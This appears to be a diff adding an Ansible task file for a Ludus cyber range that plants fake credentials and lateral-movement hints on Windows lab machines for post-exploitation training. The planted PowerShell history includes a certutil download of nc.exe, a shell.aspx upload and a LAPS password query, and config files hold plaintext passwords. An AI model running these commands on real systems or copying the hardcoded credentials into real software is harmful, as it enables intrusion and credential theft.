@@ -1,0 +1,254 @@
+---
+# ludus_files — Breadcrumbs: credential artifacts and lateral movement hints
+# Simulates real-world admin/user artifacts for post-exploitation practice
+# Techniques: credential harvesting, PowerShell history analysis, config file mining
+
+# =============================================================================
+# POWERSHELL HISTORY — Commands with embedded credentials/targets
+# Attack: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# =============================================================================
+
+- name: Deploy PowerShell history breadcrumbs
+  when: "'powershell_history' in ludus_breadcrumbs_types"
+  block:
+    - name: Create PSReadLine history directory for admin
+      ansible.windows.win_file:
+        path: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine"
+        state: directory
+      ignore_errors: true
+
+    - name: Write PowerShell history with credential breadcrumbs
+      ansible.windows.win_copy:
+        content: |
+          Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -like "*pass*"} | Select Name, Description
+          $cred = Get-Credential -UserName "{{ ludus_honeypot_company_name | default('YOURCOMPANY') }}\svc_backup" -Message "Backup"
+          Enter-PSSession -ComputerName DC01 -Credential $cred
+          Invoke-Command -ComputerName DC01,SRV01 -ScriptBlock { Get-Service } -Credential (New-Object PSCredential("{{ ludus_honeypot_company_name | default('YOURCOMPANY') }}\domainadmin", (ConvertTo-SecureString "P@ssw0rd2024!" -AsPlainText -Force)))
+          net use \\backup.{{ ludus_honeypot_domain | default('domain.local') }}\BackupRepo$ /user:svc_backup Backup2024!Summer
+          sqlcmd -S {{ ansible_hostname }},1433 -U sa -P Pr0duct10n_DB#2024 -Q "SELECT name FROM sys.databases"
+          Test-NetConnection -ComputerName 10.{{ range_second_octet | default('1') }}.10.10 -Port 5985
+          Get-ADGroupMember "Domain Admins" | Select Name
+          Invoke-WebRequest -Uri http://castelblack/upload/ -Method PUT -InFile C:\temp\shell.aspx
+          certutil -urlcache -split -f http://10.{{ range_second_octet | default('1') }}.99.1/nc.exe C:\temp\nc.exe
+          Import-Module ActiveDirectory; Get-ADObject -Filter 'ms-Mcs-AdmPwd -ne "$null"' -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
+          runas /netonly /user:{{ ludus_honeypot_company_name | default('YOURCOMPANY') }}\svc_sql "sqlcmd -S braavos -E"
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+
+# =============================================================================
+# BROWSER BOOKMARKS — IE/Edge favorites pointing to internal resources
+# Attack: Bookmark enumeration reveals internal apps, management interfaces
+# =============================================================================
+
+- name: Deploy browser bookmark breadcrumbs
+  when: "'browser_bookmarks' in ludus_breadcrumbs_types"
+  block:
+    - name: Create IE Favorites directory
+      ansible.windows.win_file:
+        path: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Favorites\\Internal Tools"
+        state: directory
+      ignore_errors: true
+
+    - name: Create IE bookmark — Domain Controller
+      ansible.windows.win_copy:
+        content: |
+          [InternetShortcut]
+          URL=https://dc01.{{ ludus_honeypot_domain | default('domain.local') }}:636
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Favorites\\Internal Tools\\LDAPS - DC01.url"
+
+    - name: Create IE bookmark — MSSQL Management
+      ansible.windows.win_copy:
+        content: |
+          [InternetShortcut]
+          URL=http://{{ ansible_hostname }}:1433
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Favorites\\Internal Tools\\SQL Server.url"
+
+    - name: Create IE bookmark — Web Application
+      ansible.windows.win_copy:
+        content: |
+          [InternetShortcut]
+          URL=http://castelblack/upload/
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Favorites\\Internal Tools\\WebDAV Upload.url"
+
+    - name: Create IE bookmark — Firewall Admin
+      ansible.windows.win_copy:
+        content: |
+          [InternetShortcut]
+          URL=https://10.{{ range_second_octet | default('1') }}.10.254
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Favorites\\Internal Tools\\Firewall Admin.url"
+
+# =============================================================================
+# CONNECTION STRINGS — Config files with database/service credentials
+# Attack: Web.config, app.config, .env file mining
+# =============================================================================
+
+- name: Deploy connection string breadcrumbs
+  when: "'connection_strings' in ludus_breadcrumbs_types"
+  block:
+    - name: Create app directories
+      ansible.windows.win_file:
+        path: "{{ cs_dir }}"
+        state: directory
+      loop:
+        - "C:\\inetpub\\wwwroot\\App_Data"
+        - "C:\\Program Files\\CompanyApp"
+      loop_control:
+        loop_var: cs_dir
+      ignore_errors: true
+
+    - name: "Breadcrumb — web.config with SQL connection string"
+      ansible.windows.win_copy:
+        content: |
+          <?xml version="1.0" encoding="utf-8"?>
+          <configuration>
+            <connectionStrings>
+              <add name="HRDatabase"
+                   connectionString="Server={{ ansible_hostname }};Database=HRApp;User Id=sa;Password=Pr0duct10n_DB#2024;Encrypt=False"
+                   providerName="System.Data.SqlClient" />
+              <add name="BackupDB"
+                   connectionString="Server=braavos.essos.local;Database=BackupCatalog;Integrated Security=False;User Id=svc_sql;Password=SQLpr0d#2024"
+                   providerName="System.Data.SqlClient" />
+            </connectionStrings>
+            <appSettings>
+              <add key="LDAPServer" value="ldap://dc01.{{ ludus_honeypot_domain | default('domain.local') }}:389" />
+              <add key="LDAPUser" value="{{ ludus_honeypot_company_name | default('YOURCOMPANY') }}\\svc_web" />
+              <add key="LDAPPassword" value="W3bApp$ecure99" />
+              <add key="SMTPServer" value="mail.{{ ludus_honeypot_domain | default('domain.local') }}" />
+            </appSettings>
+          </configuration>
+        dest: "C:\\inetpub\\wwwroot\\web.config"
+      ignore_errors: true
+
+    - name: "Breadcrumb — app.config with service credentials"
+      ansible.windows.win_copy:
+        content: |
+          # CompanyApp Configuration
+          # Environment: Production
+          DB_HOST={{ ansible_hostname }}
+          DB_PORT=1433
+          DB_NAME=CompanyDB
+          DB_USER=sa
+          DB_PASS=Pr0duct10n_DB#2024
+          LDAP_URI=ldap://10.{{ range_second_octet | default('1') }}.10.10:389
+          LDAP_BIND_DN=CN=svc_web,CN=Users,DC={{ ludus_honeypot_domain | default('domain') | regex_replace('\.', ',DC=') }}
+          LDAP_BIND_PASS=W3bApp$ecure99
+          REDIS_URL=redis://10.{{ range_second_octet | default('1') }}.10.20:6379
+          API_KEY=sk-proj-4f8a2b1c9d3e7f6a5b0c8d2e1f4a7b3c
+        dest: "C:\\Program Files\\CompanyApp\\.env"
+
+# =============================================================================
+# STICKY NOTES — Windows Sticky Notes with passwords
+# Attack: C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite
+# Simulated via a plain text file (Sticky Notes DB is complex — text file achieves same training)
+# =============================================================================
+
+- name: Deploy sticky notes breadcrumbs
+  when: "'sticky_notes' in ludus_breadcrumbs_types"
+  block:
+    - name: Create sticky notes simulation directory
+      ansible.windows.win_file:
+        path: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Desktop"
+        state: directory
+      ignore_errors: true
+
+    - name: "Breadcrumb — Sticky Notes (desktop text file)"
+      ansible.windows.win_copy:
+        content: |
+          ======== STICKY NOTE ========
+          SQL SA password: Pr0duct10n_DB#2024
+          Backup: svc_backup / Backup2024!Summer
+          VPN token: 847291
+          Wifi: {{ ludus_honeypot_company_name | default('Corp') }}WiFi2023!
+          New DC admin temp pw: Ch@ng3M3N0w!2024
+          ==============================
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Desktop\\notes.txt"
+
+# =============================================================================
+# RECENT DOCS — Shortcut files pointing to sensitive locations
+# Attack: Recent documents analysis reveals file server paths, share names
+# =============================================================================
+
+- name: Deploy recent docs breadcrumbs
+  when: "'recent_docs' in ludus_breadcrumbs_types"
+  block:
+    - name: Create Recent directory
+      ansible.windows.win_file:
+        path: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Recent"
+        state: directory
+      ignore_errors: true
+
+    - name: "Breadcrumb — Recent document shortcuts (URL files simulating LNK)"
+      ansible.windows.win_copy:
+        content: |
+          [InternetShortcut]
+          URL=file://dc01/SYSVOL/{{ ludus_honeypot_domain | default('domain.local') }}/scripts/secret.ps1
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Recent\\secret.ps1.url"
+
+    - name: "Breadcrumb — Recent backup share"
+      ansible.windows.win_copy:
+        content: |
+          [InternetShortcut]
+          URL=file://backup.{{ ludus_honeypot_domain | default('domain.local') }}/BackupRepo$/DC01_Full.bak
+        dest: "C:\\Users\\{{ defaults.ad_domain_admin | default('domainadmin') }}\\Recent\\DC01_Full.bak.url"
+
+# =============================================================================
+# REGISTRY CREDENTIALS — Stored creds in common registry locations
+# Attack: reg query for autologon, VNC, PuTTY saved sessions
+# =============================================================================
+
+- name: Deploy registry credential breadcrumbs
+  when: "'registry_creds' in ludus_breadcrumbs_types"
+  block:
+    - name: "Breadcrumb — PuTTY saved session with credentials"
+      ansible.windows.win_regedit:
+        path: "HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions\\Kali-JumpBox"
+        name: "{{ item.name }}"
+        data: "{{ item.data }}"
+        type: string
+        state: present
+      loop:
+        - { name: "HostName", data: "10.{{ range_second_octet | default('1') }}.99.1" }
+        - { name: "UserName", data: "kali" }
+        - { name: "Protocol", data: "ssh" }
+        - { name: "PortNumber", data: "22" }
+      loop_control:
+        label: "PuTTY\\{{ item.name }}"
+
+    - name: "Breadcrumb — WinSCP stored credential hint"
+      ansible.windows.win_regedit:
+        path: "HKCU:\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\BackupServer"
+        name: "{{ item.name }}"
+        data: "{{ item.data }}"
+        type: string
+        state: present
+      loop:
+        - { name: "HostName", data: "backup.{{ ludus_honeypot_domain | default('domain.local') }}" }
+        - { name: "UserName", data: "svc_backup" }
+        - { name: "PortNumber", data: "22" }
+      loop_control:
+        label: "WinSCP\\{{ item.name }}"
+
+# =============================================================================
+# CUSTOM BREADCRUMBS
+# =============================================================================
+
+- name: Deploy custom breadcrumbs
+  when: ludus_breadcrumbs_custom | default([]) | length > 0
+  block:
+    - name: Deploy custom breadcrumb files
+      ansible.windows.win_copy:
+        content: "{{ item.content }}"
+        dest: "{{ item.path }}"
+      loop: "{{ ludus_breadcrumbs_custom | selectattr('path', 'defined') | list }}"
+      loop_control:
+        label: "{{ item.type | default('custom') }} -> {{ item.path }}"
+
+# =============================================================================
+# SUMMARY
+# =============================================================================
+
+- name: Log breadcrumbs deployment
+  ansible.builtin.debug:
+    msg: |
+      Breadcrumbs deployed:
+        Types: {{ ludus_breadcrumbs_types | join(', ') }}
+        Custom entries: {{ ludus_breadcrumbs_custom | default([]) | length }}
